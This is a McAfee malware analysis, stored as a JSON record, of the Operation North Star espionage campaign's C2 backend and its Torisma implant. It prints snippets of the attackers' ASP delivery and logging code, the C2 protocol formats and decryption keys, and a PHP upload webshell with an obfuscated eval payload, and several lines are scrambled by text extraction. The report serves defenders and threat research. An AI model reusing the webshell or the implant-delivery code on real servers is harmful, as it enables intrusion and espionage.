{
    "id": "cedf75a2-2772-47a7-8592-c364a86af87e",
    "created_at": "2023-01-12T15:08:59.926754Z",
    "updated_at": "2025-03-27T02:17:23.019481Z",
    "deleted_at": null,
    "sha1_hash": "85e63ebdf932a30f6a0bd380e74902d14137d279",
    "title": "2020-11-05 - Operation North Star- Behind The Scenes",
    "authors": "",
    "file_creation_date": "2022-05-27T21:27:34Z",
    "file_modification_date": "2022-05-27T21:27:34Z",
    "file_size": 2713338,
    "plain_text": "# Operation North Star: Behind The Scenes\n\n**mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-behind-the-scenes/**\n\n## Executive Summary\n\n\nNovember 5, 2020\n\n\nIt is rare to be provided an inside view on how major cyber espionage campaigns are conducted within the digital realm. The only transparency\nafforded is a limited view of victims, a malware sample, and perhaps the IP addresses of historical command and control (C2) infrastructure.\n\nThe Operation North Star campaign we detailed earlier this year provided just this. This campaign used social media sites, spearphishing and\nweaponized documents to target employees working for organizations in the defense sector. This early analysis focused on the adversary’s\ninitial intrusion vectors, described the first stages of how an implant was installed, and how it interacted with the Command and Control (C2)\nserver.\n\nHowever, that initial disclosure left gaps such as the existence of secondary payload, and additional insights into how the threat actors carried\nout their operations and who they targeted. The updated report takes a unique deep dive following our identification of previously undiscovered\ninformation into the backend infrastructure run by the adversaries.\n\nThese findings reveal a previously undiscovered secondary implant known as Torisma. However, more telling are the operational security\nmeasures that were undertaken to remain hidden on compromised systems. In particular, we saw the application of an Allow and Block list of\nvictims to ensure the attacker’s secondary payload did not make its way to organizations that were not targeted. This tells us that certainly\nthere has been a degree of technical innovation exhibited not only with the use of a template injection but also in the operations run by the\nadversary.\n\nFinally, while we cannot confirm the extent of the success of the adversary’s attacks, our analysis of their C2 log files indicate that they\nlaunched attacks on IP-addresses belonging to internet service providers (ISPs) in Australia, Israel and Russia, and defense contractors based\nin Russia and India.\n\nThe findings within this report are intended to provide you, the reader, unique insights into the technology and tactics the adversary used to\ntarget and compromise systems across the globe.\n\n### Compromised Site\n\nOperation North Star C2 infrastructure consisted of compromised domains in Italy and other countries. Compromised domains belonged, for\nexample, to an apparel company, an auction house and printing company. These URLs hosted malicious DOTM files, including a malicious\nASP page.\n\nhxxp://fabianiarte com:443/uploads/docs/bae defqa logo jpg\n\n\n-----\n\nps // ab a a te co /up oads/ gp oject/9 C803 C 9 5 068 95 5 0 jpg\nhttps://www.fabianiarte.com/include/action/inc-controller-news.asp\n\nThe domain fabianiarte.com (fabianiarte.it) was compromised to host backend server code and malicious DOTM files. This domain hosted\nDOTM files that were used to mimic defense contractors’ job profiles as observed in Operation North Star, but the domain also included some\nrudimentary backend server code that we suspect was used by the implant. Log files and copies appeared in the wild pertaining to the\nintrusion of this domain and provided further insight. According to our analysis of this cache of data this site was compromised to host code on\n7/9/2020.\n\nTwo DOTM files were discovered in this cache of logs and other intrusion data. These DOTM files belong to campaigns 510 and 511 based on\nthe hard-coded value in the malicious VB scripts.\n\n22it-34165.jpg\n21it-23792.jpg\n\n**Developments in Anti-Analysis Techniques**\n\nDuring our analysis we uncovered two DOTM files as part of the cache of data pertaining to the backend. In analyzing first stage implants\nassociated with the C2 server over a period of seven months, we found that there were further attempts by the adversary to obfuscate and\nconfuse analysts.\n\nHaving appeared in July, these DOTM files contained first stage implants embedded in the same location as we documented in our initial\nresearch. However, previous implants from other malicious DOTM files were double base64 encoded and the implants themselves were not\nfurther obfuscated. However, there were some notable changes in the method that differed from those detailed in our initial research:\n\nThe first stage implant that is nested in the DOTM file, is using triple base64 encoding in the Visual Basic Macro\nThe extracted DLL (desktop.dat) is packed with the Themida packer attempting to make analysis more difficult.\n\nThe first stage implant extracted from the DOTM files contains an encrypted configuration file and an intermediate dropper DLL. The\nconfiguration file, once decrypted, contains information for the first stage implant. The information includes the URL for the C2 and the\ndecryption keys for the second stage payload called “Torisma”.\n\nContents of decrypted configuration\n\n\n-----\n\necause t e co gu at o e co ta s o at o o o to co u cate t t e C, t a so sto es t e pa a ete opt o s ( ed, g, ) t s\ncase, we see an unknown fourth parameter known as nl, however it does not appear to be implemented in the server-side ASP code. It is\npossible that the adversary may have intended to implement it in the future.\n\nAppearance of nl parameter\n\nIn addition, analysis of the backend components for this compromised server enables us to draw a timeline of activity on how long the attacker\nhad access. For example, the DOTM files mentioned above were placed on the compromised C2 server in July 2020. Some of the main\nmalicious components involved in the backend operation were installed on this server in January 2020, indicating that this C2 server had been\nrunning for seven months.\n\n### Digging into the Heart of Operation North Star – Backend\n\n**Inc-Controller-News.ASP**\n\nAs we covered in our initial Operation North Star research, the overall attack contained a first stage implant delivered by the DOTM files. That\nresearch found specific parameters used by the implant and that were sent to the C2 server.\n\nFurther analysis of the implant “wsdts.db” in our case, revealed that it gathers information of the victim’s system. For example:\n\nGet system disks information\nGet Free disk space information\nGet Computer name and (logged in) Username\nProcess information\n\nWhen this information is gathered, they will be communicated towards the C2 server using the parameters (ned, gl, hl).\n\nThese parameters are interpreted by an obfuscated server-side ASP page, based on the values sent will depend on the actions taken upon the\nvictim. The server-side ASP page was placed on the compromised server January 2020.\n\nAdditionally, based on this information the adversary is targeting Windows servers running IIS to install C2 components.\n\nThe server-side ASP page contains a highly obfuscated VBScript embedded that, once decoded, reveals code designed to interact with the\nfirst stage implant. The ASP page is encoded with the VBScript.Encode method resulting in obfuscated VBScript code. The first stage implant\ninteracts with the server-side ASP page through the usage of these finite parameters.\n\nEncoded VBScript\n\nOnce the VBScript has been decoded it reveals a rather complex set of functions. These functions lead to installing additional stage implants\non the victim’s system. These implants are known as Torisma and Doris, both of which are base64 encoded. They are loaded directly into\nmemory via a binary stream once conditions have been satisfied based on the logic contained within the script.\n\n\n-----\n\necoded Sc pt\n\nThe ASP server-side script contains code to create a binary stream to where we suspect the Torisma implant is written. We also discovered\nthat the Torisma implant is embedded in the ASP page and decoding the base64 blob reveals an AES encrypted payload. This ASP page\ncontains evidence that indicates the existence of logic that decodes this implant and deliver it to the victim.\n\nfunction getbinary(sdata)\nconst adtypetext = 2\n\nconst adtypebinary = 1\n\ndim binarystream\n\ndim aa\n\naa = “adodb.stream”\n\nset binarystream = createobject(aa)\n\nbinarystream.type = adtypetext\n\nbinarystream.charset = “unicode”\n\nbinarystream.open\n\nbinarystream.writetext sdata\n\nbinarystream.position = 0\n\nbinarystream.type = adtypebinary\n\nbinarystream.position = 2\n\ngetbinary = binarystream.read\n\nend function\n\nDepending on the values sent, additional actions are performed on the targeted victim. Further analysis of the server-side script indicates that\nthere is logic that depends on some mechanism for the actor to place a victim’s IP address in an allowed-list file. The second stage implant is\nnot delivered to a victim unless this condition is met first. This alludes to the possibility that the actor is reviewing data on the backend and\nselecting victims, this is likely performed through another ASP page discovered (template-letter.asp).\n\nThe server-side ASP page contains code to interpret the data sent via the following parameters to execute additional code. The values to\nthese parameters are sent by the first stage implant initially delivered by the DOTM files. These parameters were covered in our initial\nresearch, however having access to the C2 backend code reveals additional information about their true purpose.\n\n**Parameter** **Description**\n\nNED Campaign code embedded in DOTM Macro\n\nGL System Information\n\nHL Flag to indicate OS architecture (32 or 64 bits)\n\nThe URL query string is sent to the C2 server in the following format.\n\nhttp://hostname/inc-controller-news.asp?ned=campaigncode&gl=base64encodeddata&hl=0\n\nFurther, code exists to get the infected victim’s IP address; this information is used to check if the IP address is allowed (get the second stage)\nor if the IP address has been blocked (prevent second stage). As mentioned previously, the addition of the victim’s IP address into the fake\nMP3 files is likely performed manually through identification of incoming connections through the stage 1 implant.\n\n\n-----\n\nfunction getstripaddress()\non error resume next\n\ndim ip\n\nip = request.servervariables(“http_client_ip”)\n\nif ip = “”\n\nthen ip = request.servervariables(“http_x_forwarded_for”)\n\nif ip = “”\n\nthen ip = request.servervariables(“remote_addr”)\n\nend if end\n\nif\n\ngetstripaddress = ip\n\nend function\n\nThe full code of the logic gets the IP address for the connecting client machine and writing victim entries to a log file. In breaking down this\ncode we can see different functionality is used that is most interesting. These log files are also stored within the WWW root of the\ncompromised server based on the variable strlogpath.\n\nFrom the below code-snippet of the vbscript, we can see that the “gl” and “hl” parameters are used to query the system information from the\nvictim (gl) and the OS architecture (32 or 64 bits):\n\nstrinfo=replace(request.form(“gl “),””,” + “):strosbit=replace(request.form(“hl “),””,” + “)\n\n**_Victim Logging_**\n\nThe adversary keeps track of victims through logging functionality that is implemented into the server-side ASP code. Furthermore, as\ndescribed above, the backend server code has the ability to perform victim logging based on first stage implant connections. This log file is\nstored in the WWW root directory on the compromised C2 server. The following code snippet will write data to a log file in the format [date, IP\n**_Address, User Agent, Campaign Code (NED), System Info (GL), OS Architecture (HL)]._**\n\nstrlog = date() & “” & formatdatetime(now(), 4)\nr = writeline(strlogpath, strlog)\n\nr = writeline(strlogpath, stripaddr)\n\nr = writeline(strlogpath, strua)\n\nr = writeline(strlogpath, strcondition)\n\nr = writeline(strlogpath, strinfo)\n\nr = writeline(strlogpath, strosbit)\n\nThe server-side ASP code will check whether the IP address is part of an allow-list or block-list by checking for the presence of the IP in two\nserver-side files masquerading as MP3 files. The IP address is stored in the format of an MD5 hash, contained within the server-side code as a\nfunction to create a MD5 hash. The code is looking for these files in the WWW root of the compromised server based on the variable\nstrWorkDir.\n\nUsing an ‘allow-list’ is a possible indication that it contained the list of their pre-determined targets.\n\nstrWorkDir = “C:\\”:strLogPath=strWorKdir&”lole3D_48_02_05.mp3″:StrWhiteFile=strWorkDir&”wole3D_48_02_05.mp3\n“:strBlAcKFile=strWorkDir&”bole3D_48_02_05.mp3”:stripAddr=GeTStrIpAddress():strMD5IpAddr=MD5(strIpAddr):strUA=Request.serveRVariable\n“)\n\nIP allow-list / blocklist checking\n\nFor MD5 hash generation, the system appears to be using a non-standard form of hashing for the IP addresses. In most cases, the built in\nMicrosoft cryptographic service provider would be used to generate an MD5. In this case, however, the actor chose to use a custom method\ninstead.\n\nThe IP address is retrieved and hashed using this method.\n\n\n-----\n\nstripaddr=getstripaddress()\nstrmd5ipaddr=md5(stripaddr)\n\nThe following function (ipopk) is set to read from a file that stores hashed IPs and will be used later in a conditional block statement. The code\nbelow will open and read a file, if there is no data the flag for ipok will result in 0, if there is data then the resulting value will be 1.\n\nfunction ipok(hashfile, stripaddr)\non error resume next\n\ndim fso, fs, linedata\n\nset fso = server.createobject(“scripting.filesystemobject”)\n\nset fs = fso.opentextfile(hashfile, 1, true)\n\nipok = 0\n\ndo until fs.atendofstream\n\nlinedata = lcase(fs.readline)\n\nif len(linedata) > 0 and instr(stripaddr, linedata) then ipok = 1\n\nexit do\n\nend if loop\n\nfs.close\n\nset fs = nothing\n\nend function\n\nThe following code is the logic to determine if an infected victim should receive the Torisma implant. A series of cases are used to make the\ndecision depending on specific conditions as depicted in the code. Below the cases are explained:\n\nIf the victim’s IP-address is on the allow-list, and the OS architecture bit value is “1” (resembling 64 bits), the Torisma 64 bits version\nimplant will be sent to the victim and in the log file the term “case_1_64” is written behind the victim, meaning 64 bit version of the\nTorisma implant sent.\nSame for the second case but now for a 32-bit version OS (value 0) and the term “case_1_86” is written, meaning 32-bit implant version\nof torisma sent.\nIf the ip-address of the victim is on the block list with either 32/64 bit OS architecture, a non-sense payload called “doris_x86” “doris_x64”\nwill be sent to the victim. For example, in our case this was the value for “doris_x86”: DoriS_x86=”ddddddd”\nIf condition “24” is returned from the victim, a log entry is written with value “case_3” and no implant sent and an http response status of\n405 is sent\nIf neither of the above conditions are met, “case_4” is written in the log-file, no implant sent and again an http response status of 405 is\nsent.\n\nAn http 405 response code indicates that the request method is known by the server but is not supported by the target resource.\n\nif ipok(strwhitefile, strmd5ipaddr) = 1 and instr(strosbit, “1 “) > 0 then r = writeline(strlogpath, “case_1_64 “) strresdata =\nstrbase64_torisma_x64\nelse if ipok(strwhitefile, strmd5ipaddr) = 1 and instr(strosbit, “0 “) > 0 then r = writeline(strlogpath, “case_1_86 “) strresdata =\nstrbase64_torisma_x86\n\nelse if ipok(strblackfile, strmd5ipaddr) = 1 and instr(strosbit, “1 “) > 0 then r = writeline(strlogpath, “case_2_64 “) strresdata =\nstrbase64_doris_x64\n\nelse if ipok(strblackfile, strmd5ipaddr) = 1 and instr(strosbit, “0 “) > 0 then r = writeline(strlogpath, “case_2_86 “) strresdata =\nstrbase64_doris_x86\n\nelse if instr(strcondition, “24 “) > 0 then r = writeline(strlogpath, “case_3 “) response.status = “405”\n\nelse r = writeline(strlogpath, “case_4 “) response.status = “405 “end\n\nLogic to deliver 2nd stage implant to victim\n\n### Inside the Torisma Implant\n\n\n-----\n\nO e o t e p a y object es o Ope at o o t Sta o at e ca te s to sta t e o s a p a t o t e ta geted ct s syste\nbased on a set of logic. Further, the end goal is executing custom shellcode post Torisma infection, thus running custom actions depending on\nthe specific victim profiles. As described earlier, Torisma is delivered based on data sent from the victim to the command and control server.\nThis process relies on the first stage implant extracted from VB macro embedded in the DOTM file.\n\nGeneral process flow and component relationship\n\nFurther, Torisma is a previously unknown 2nd stage implant embedded in the server-side ASP page as a base64 encoded blob. Embedded is a\n64 and 32-bit version and depending on the OS architecture flag value sent by the victim and will determine what version is sent. Further this\nimplant is loaded directly into memory as a result of interaction between the victim and the command and control server. The adversary went to\ngreat lengths to obfuscate, encrypt and pack the 1 and 2st nd stage implants involved in this specific case.\n\nOnce Torisma is decoded from Base64 the implant is further encrypted using an AES key and compressed. The server-side ASP page does\nnot contain any logic to decrypt the Torisma implant itself, rather it relies on decryption logic contained within the first stage implant. The\ndecryption key exists in an encrypted configuration file, along with the URL for the command and control server.\n\nThis makes recovery of the implant more difficult if the compromised server code were to be recovered by incident responders.\n\nThe decryption method is performed by the first stage implant using the decryption key stored in the configuration file, this key is a static32-bit\nAES key. Torisma can be decoded with a decryption key 78b81b8215f40706527ca830c34b23f7.\n\n\nFurther, after decrypting the Torisma binary, it is found to also be packed with lz4 compression giving it another layer of protection. Once\ndecompressing the code, we are now able to analyze Torisma and its capabilities giving further insight into Operation North Star and the 2\nstage implant.\n\n\nnd\n\n\nThe variant of the implant we analyzed was created 7/2/2020; however, given that inc-controller-news.asp was placed on the C2 in early 2020,\nit indicates the possibility of multiple updates.\n\nBased on the analysis, Torisma is sending and receiving information with the following URLs.\n\nhxxps://www.fabianiarte.com/newsletter/arte/view.asp\nhxxps://www.commodore.com.tr/mobiquo/appExtt/notdefteri/writenote.php\nhxxp://scimpex.com:443/admin/assets/backup/requisition/requisition.php\n\n**Encrypted Configuration File**\n\nTorisma also uses encrypted configuration files just as with the 1 stage implant to indicate what URLs it communicates with as a commandst\nand control, etc.\n\n\n-----\n\nec ypted co gu at o e\n\nThe configuration file for Torisma is encrypted using the algorithm VEST[1] in addition to the communication sent over the C2 channel. From\nour research this encryption method is not commonly used anywhere, in fact it was a proposed cipher that did not become a standard to be\nimplemented in general technologies[2].\n\nFurther, the FOUND002.CHK file recovered from the backend is used to update the configuration and contains just URLs with .php extension.\nThese URLs have pages with a .php extension, indicating that some of the backend may have been written in PHP. It’s unclear what the role of\nthe servers with .PHP pages have in the overall attack. Though we can confirm based on strings and functions in Torisma that there is code\ndesigned to send and receive files with the page view.asp. This view.asp page is the Torisma implant backend from what our analysis shows\nhere. Later in this analysis we cover more on view.asp, however that page contained basic functionality to handle requests, send and receive\ndata with an infected victim that has the Torisma implant.\n\n### Main Functionality\n\nAccording to our analysis, the Torisma code is a custom developed implant focused on specialized monitoring.\n\nThe role of Torisma is to monitor for new drives added to the system as well as remote desktop connections. This appears to be a more\nspecialized implant focused on active monitoring on a victim’s system and triggering the execution of payloads based on monitored events.\nThe end objective of Torisma is executing shellcode on the victim’s system and sending the results back to the C2.\n\nThe Torisma code begins by running a monitoring loop for information gathering.\n\nInformation gathering loop\n\n**General Process**\n\nIt runs the monitoring routine but will first check if monitoring is enabled based on the configuration (disabled by default). The general logic of\nthis process is as follows:\n\n1. If monitoring is disabled, just return\n2. Else call the code that does the monitoring and upon completion temporarily disable monitoring\n3. When run, the monitoring will be executed for a specified amount of time based on a configuration value\n4. Upon return of the monitoring function, the code will proceed to command and control communication\n5. If there is repeated failure in communication, the implant will force monitoring for 1hr and then retry the communication\n6. Repeat forever\n\n\n-----\n\nTriggering monitoring based on configuration\n\n**Monitoring**\n\nThe monitoring loop will retrieve the address of WTSEnumerateSessionsW and the local mac address using GetAdaptersInfo.\n\n1. The code will execute on a loop, until either enough time has elapsed (end time passed a parameter) or an event of interest occurred\n\nMonitoring loop\n\n1. It will monitor for an increase in the number of logical drives and Remote Desktop Sessions (RDS). If either occur, a status code will be\n\nset (5. New drive, 6. New RDS session) and the monitoring loop stops.\n\n_D i_ _t_ _ki_\n\n\n-----\n\na t uses Get og ca es to get a b t as o a t e d es a a ab e o t e syste, t e te ates o e eac poss b e d e ette\n\nb. It will also use GetDriveType to make sure the new drive is not a CD-ROM drive\n\nCheck drive type\n\n1. It keeps track of the number of drives previously seen and will return 1 if the number has increased\n\n**_RDP Session Tracking_**\n\nThe RDP session tracking function operates the same as the drive tracking. If the number increases by one it then returns 1. It uses\nWTSEnumerateSessionsW to get a list of sessions, iterates through them to count active ones.\n\nGet active RDP sessions\n\n\n-----\n\nGet active RDP sessions, continued\n\n### Command and Control Communication\n\nThe C2 code is interesting and is a custom implementation. The general process for this protocol is as follows.\n\n1. Generates a connection ID that will be kept throughout this step as a hex string of five random bytes for each module (0x63) and random\n\nseeded with the output of GetTickCount64\n\nGenerate connection ID\n\n1. Next it loads a destination URL\n\na. There are three available servers hardcoded in the implant as an encrypted blob\n1. b. The decryption is done using a VEST-32 encryption algorithm with the hardcoded key ff7172d9c888b7a88a7d77372112d772\n\n\n-----\n\nConfiguration Decryption\n\nc. A random configuration number is picked (mod 6) to select this configuration\n\nd. There are only 3 configurations available, if the configuration number picked is above 3, it will keep incrementing (mod 6) until one is picked.\nConfiguration 0 is more likely to be chosen because of this process.\n\nCode to pick configurations\n\n1. It will send a POST request to the URL it retrieved from the configuration with a “VIEW” action. It builds a request using the following\n\nhardcoded format string.\n\n\n-----\n\npost => ACTION=VIEW&PAGE=%s&CODE=%s&CACHE=%s&REQUEST=%d\n=> PAGE=drive_count\n\nCODE=RDS_session_count\n\nCACHE=base64(blob)\n\nRequest=Rand()\n\nblob: size 0x43c\n\nblob[0x434:0x438] = status_code\n\nblob[0x438:0x43c] = 1\n\nblob[0:0x400] = form_url\n\nblob[0x400:0x418] = mac_address\n\nblob[0x418:0x424] = connection_id (random)\n\nblob[0x424:0x434] = “MC0921” (UTF-16LE)\n\na. The process will be looking for the return of the string Your request has been accepted. ClientID: {f9102bc8a7d81ef01ba} to indicate\nsuccess\n\n1. If successful, it will retrieve data from the C2 via a POST request, this time it will use the PREVPAGE action\n\na. It uses the following format string for the POST request\n\nACTION=PREVPAGE&CODE=C%s&RES=%d\nWith: CODE = connection_id (from before)\n\nRES = Rand()\n\nb. The reply received from the server is encrypted it. To decrypt it the following process is needed\n\ni. Replace space with +\n\nii. Base64 decode the result\n\niii. Decrypt the data with key “ff7172d9c888b7a88a7d77372112d772”\n\nServer decryption using key\n\niv. Perform a XOR on the data\n\n\n-----\n\nPerform XOR on the data\n\n1.\n\n1. The decrypted data is going to be used to execute a shellcode from the server and send data back\n\na. Data from the server will be split into a payload to execute and the data passed as an argument that is being passed to it\nb. Part of the data blob sent from the server is used to update the local configuration used for monitoring\n\ni. The first 8 bytes are fed to a add+xor loop to generate a transformed version that s compared to hardcoded values\n\nConfiguration check\n\n\n-----\n\nConfiguration check continued\n\nii. If the transformed data matched either of the two hardcoded values, the local configuration is updated\n\niii. In addition, the duration of the observation (for the Drive/RDS) loop can be updated by the server\n\niv. If the duration is above 0x7620 (21 days) it will then re-enable the monitoring even if the configuration detailed above had disabled it\n\nv. If the transformed data doesn’t match any of the two hardcoded values, then monitoring will be disabled by the configuration\n\nc. The implant will create a new communication thread and will wait until its notified to continue. It will then proceed to execute the shellcode\nand then wait for the other thread to terminate.\n\nd. Depending on what occurred (an error occurred, or monitoring is enabled/disabled) the code will return a magic value that will decide if the\ncode needs to run again or return to the monitoring process.\n\nReturn to communications loop\n\n1.\n\n1. The communications thread will create a new named pipe (intended to communicate with the shellcode). It the notifies the other\n\nthread once the pipe is ready and then proceed to send data read from the pipe to the server.\n\na. The pipe name is \\\\.\\pipe\\fb4d1181bb09b484d058768598b\n\n\n-----\n\nCode for named pipe\n\nb. It will read data from the pipe (and flag the processing as completed if it finds “- – – – – – – – -“\n\nc. It will then send the data read back to the C2 by sending a POST in the following format\n\nACTION=NEXTPAGE\nACTION=NEXTPAGE&CODE=S%s&CACHE=%s&RES=%d\n\nCODE=connection_id\n\nCACHE=base64(message)\n\nRES = Rand()\n\nd. Data is encrypted following the same pattern as before, data is first XORED and then encrypted using VEST-32 with the same key as before\n\ne. This will be repeated until the payload thread sends the “- – – – – – – – -“message or that the post failed\n\n### Campaign Identification\n\nOne way the adversary keeps track of what victims are infected by what version of the first stage implant is by using campaign IDs. These IDs\nare hard coded into the VB macro of the template document files that are retrieved by the first stage maldoc.\n\nThey are sent to the backend server through the NED parameter as covered earlier, further they are read and interpreted by the ASP code.\n\n**Victimology**\n\nAccording to the raw access logs for Inc-Controller-News.asp it is possible to understand what countries were impacted and it matches with\nthe logs we discovered along another .asp page (view.asp), which we will explain later in the document.\n\n\n-----\n\nBased on one of C2 log files we could identify the following about the victims:\n\nRussian defense contractor\nTwo IP addresses in two Israeli ISP address spaces\nIP addresses in Australian ISP space\nIP address in Russian ISP address space\nIndia-based defense contractor\n\n**Template-letter.asp**\n\nDuring our investigation we uncovered additional information that led to the discovery of additional ASP pages. One ASP page discovered on\nthe same compromised command and control server contained interesting code. First this ASP page is encoded in the same method using\nVB.Encode as we observed with the code that delivers the Torisma implant. Second it appears that the code is part of the core backend\nmanaged by the attacker and had the original file name of board_list.asp. Based on in the wild submission data the file board_list.asp first\nappeared in Korea October 2017, this suggests that this code for this webshell has been in use since 2017.\n\nFurther, this ASP page is a custom webshell that according to our knowledge and sources is not an off-the-shelf common webshell, rather\nsomething specifically used in these attacks. Some of the actions include browsing files, executing commands, connecting to a database, etc.\nThe attacker is presented with the login page and a default base64 encoded password of ‘venus’ can be used to login (this value is hardcoded\nin the source of this page).\n\nTemplate-Letter.ASP main page\n\n\n-----\n\nFunctionality to execute commands\n\n**VIEW.ASP -Torisma Backend**\n\nThe View.ASP file is equally important as the inc-controller-news.asp file and contains interesting functionality. This ASP page is the backend\ncode for the Torisma implant, and the functions are intended to interact with the infected victim.\n\nThe view.asp file contains the following references in the code:\n\nThe file “FOUND001.CHK” contains a “logfile” as the CONST value name possibly refers to “logvault”.\n\nAnalyzing the possible victims revealed an interesting list:\n\nRussia-based defense contractor\nTwo IP addresses in two Israeli ISP address spaces\nIP address in Russian ISP address space\nIndia-based defense contractor\n\nThe file “FOUND002.CHK” contains a Base64 string that decodes to:\n\nhxxps://www.krnetworkcloud.org/blog/js/view.php|www.krnetworkcloud.org|2|/blog/js/view.php|NT\n\nThe above domain was likely compromised to host malicious code, given it belongs to an Indian IT training company.\n\nThe Const value name for “FOUND002.CHK” is “cfgvault”, the first three letters might refer to “configuration”. This ASP code contains\nadditional functions that may indicate what role this page has in the overall scheme of things. View.asp is the Torisma implant backend code\nwith numerous functions implemented to handle requests from the implant as described earlier in this analysis. Based on our analysis of both\nthe Torisma implant and this backend code, some interesting insight has been discovered. First implemented in the ASP code are the general\nactions that can be taken by this backend depending on the interaction with Torisma.\n\nSome of these actions are triggered by the implant connecting and the others may be invoked by another process. The main ASP page is\nimplemented to handle incoming requests based on a request ACTION with several possible options to call. Given that the implant is driven by\nthe “ACTION” method when it comes to the C2 communication, a number of these cases could be selected. However, we only see code\n\n\n-----\n\np e e ted o s a to ca a d a d e t e equest/ espo se ec a s o G a d G, t us t ese ot e act o s a e\nlikely performed by the adversary through some other process.\n\nGeneral actions by View.ASP\n\n**ViewPrevPage**\n\nAs described in the analysis, the ViewPrevPage action is a function designed to handle incoming requests from Torisma to get data. The data\nsent to Torisma appears to be in the form of ~dmf files. This content for the ViewPrevPage action comes in the form of shellcode intended to\nbe executed on the victim side according to the analysis of the implant itself.\n\nViewPrevPage function\n\n**ViewNextPage**\n\nTorisma uses this method to send data back to the C2 server read from the named pipe. This is the results of the execution of the shellcode on\nthe victim’s system through the ViewPrevPage action and the results of this execution are sent and processed using this function.\n\n\n-----\n\nImplant sends data to C2\n\n**ViewGallery**\n\nThere is no function in Torisma implemented to call this function directly, this is likely called from another administration tool, probably\nimplemented in the upstream server. A static analysis of this method reveals that it is likely intended to retrieve log files in a base64 encoded\nformat and write the response. Like the Torisma implant, there is a response string that is received by the calling component that indicates the\nlog file had been retrieved successfully and that it should then delete the log file.\n\nRetrieve and write log file content in base64 format (ViewGallery)\n\n**ViewMons**\n\nAnother function also not used by Torisma is intended to set the local configuration file. It appears to use a different request method than\nACTION; in this case it uses MAILTO. Based on insight gathered from Torisma, we can speculate this is related to configuration files that are\nused by the implant.\n\n\n-----\n\nViewMons function\n\n**SendData**\n\nThis function is used in the RedirectToAdmin method exclusively and is the mechanism for sending data to the upstream C2. It depends on the\nGetConfig function that is based on the stored value in the cfgvault variable.\n\nSend Data\n\n**RedirectToAdmin**\n\nThis function is used to redirect information from an infected victim to the master server upstream. This is an interesting function indicating\nadditional infrastructure beyond the immediate C2 with which we observed Torisma communicating.\n\nRedirectToAdmin\n\n**WriteAgentLog**\n\nAs part of the process of tracking victim’s with Torisma, the ASP code has a function to write log files. These resulting log files indicate success\nfor the execution of shellcode on victims running Torisma. This logging method captures the user agent and IP address associated with the\nvictim being monitored. This function is called when the information is sent to the master server via the RedirectToAdmin method.\n\nAnalysis of the server logs indicates the following countries made connections to the View.ASP page in July 2020.\n\nIndia\nAustralia\n\n\n-----\n\ns ae\nFinland\n\n**Webshells**\n\nDuring our analysis we were able to determine that in some instances the attacker used webshells to maintain access. Discovered on another\ncompromised server by the same actor with the same type of code was a PHP Webshell known as Viper 1337 Uploader. Based on our\nanalysis this is a modified variant of Viper 1337 Uploader.\n\n<title>Viper 1337 Uploader</title>\n<?php\n\necho ‘<form action=”” method=”post” enctype=”multipart/form-data” name=”uploader” id=”uploader”>’;\n\necho ‘<input type=”file” name=”file” size=”50″><input name=”_upl” type=”submit” id=”_upl” value=”Upload”></form>’;\n\nif( $_POST[‘_upl’] == “Upload” ) {\n\nif(@copy($_FILES[‘file’][‘tmp_name’], $_FILES[‘file’][‘name’])) { echo ‘<b>Shell Uploaded ! :)<b><br><br>’; }\n\nelse { echo ‘<b>Not uploaded ! </b><br><br>’; }\n\n}\n\n?>\n\n<?php\n\neval(base64_decode(‘JHR1anVhbm1haWwgPSAnS2VsdWFyZ2FIbWVpN0B5YW5kZXguY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VS\n\n?>\n\nSome additional log file analysis reveals that a dotm file hosted with a. jpg extension was accessed by an Israeli IP address. This IP address\nlikely belongs to a victim in Israel that executed the main DOCX. Based on the analysis of the user-agent string belonging to the Israel IP\naddress Microsoft+Office+Existence+Discovery indicates that the dotm file in question was downloaded from within Microsoft Office (template\ninjection).\n\n**Attacker Source**\n\nAccording to our analysis the attacker accessed and posted a malicious ASP script “template-letter.asp” from the IP address 104.194.220.87\non 7/9/2020. Further research indicates that the attacker is originating from a service known as VPN Consumer in New York, NY.\n\nSnipped from log file showing attacker IP 104.194.220.87\n\nFrom the same logfiles, we observed the following User Agent String:\n\n“Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+10.0;+Win64;+x64;+Trident/7.0;+.NET4.0C;+.NET4.0E;+ms-office;+MSOffice+16)”\n\nDecoding the User Agent string we can make the following statement\n\nThe attacker is using a 64bit Windows 10 platform and Office 2016.\n\nThe Office version is the same as we observed in the creation of the Word-documents as described in our document analysis part of Operation\nNorthStar.\n\n### Conclusion\n\nIt is not very often that we have a chance of getting the C2 server code pages and associated logging in our possession for analysis. Where\nwe started with our initial analysis of the first stage payloads, layer after layer we were able to decode and reveal, resulting in unique insights\ninto this campaign.\n\nAnalysis of logfiles uncovered potential targets of which we were unaware following our first analysis of Operation North Star, including internet\nservice providers and defense contractors based in Russia and India.\n\n\n-----\n\nOu a a ys s e ea s a p e ous y u o seco d stage p a t o as o s a c e ecutes a custo s e code, depe d g o spec c\nvictim profiles, to run custom actions. It also illustrates how the adversary used compromised domains in Italy and elsewhere, belonging to\nrandom organizations such as an auction house and printing company, to collect data on victim organizations in multiple countries during an\noperation that lasted nearly a year.\n\nThis campaign was interesting in that there was a particular list of targets of interest, and that list was verified before the decision was made to\nsend a second implant, either 32 or 64 bits, for further and in-depth monitoring. Progress of the implants sent by the C2 was monitored and\nwritten in a log file that gave the adversary an overview of which victims were successfully infiltrated and could be monitored further.\n\nOur findings ultimately provide a unique view into not only how the adversary executes his attacks but also how he evaluates and chooses to\nfurther exploit his victims.\n\n[Read our McAfee Defender’s blog to learn more about how you can build an adaptable security architecture against the Operation North Star](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/mcafee-defenders-blog-operation-north-star-campaign/)\ncampaign.\n\n_Special thanks to Philippe Laulheret for his assistance in analysis_\n\n[1] https://www.ecrypt.eu.org/stream/p2ciphers/vest/vest_p2.pdf\n\n[2] https://www.ecrypt.eu.org/stream/vestp2.html\n\n[Christiaan Beek Lead Scientist & Sr. Principal Engineer](https://www.mcafee.com/blogs/author/christiaan-beek/)\nChristiaan Beek is the Lead Scientist & Sr. Principal Engineer of the Enterprise Office of the CTO. He is leading the strategic threat intelligence\nresearch with a focus on inventing...\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
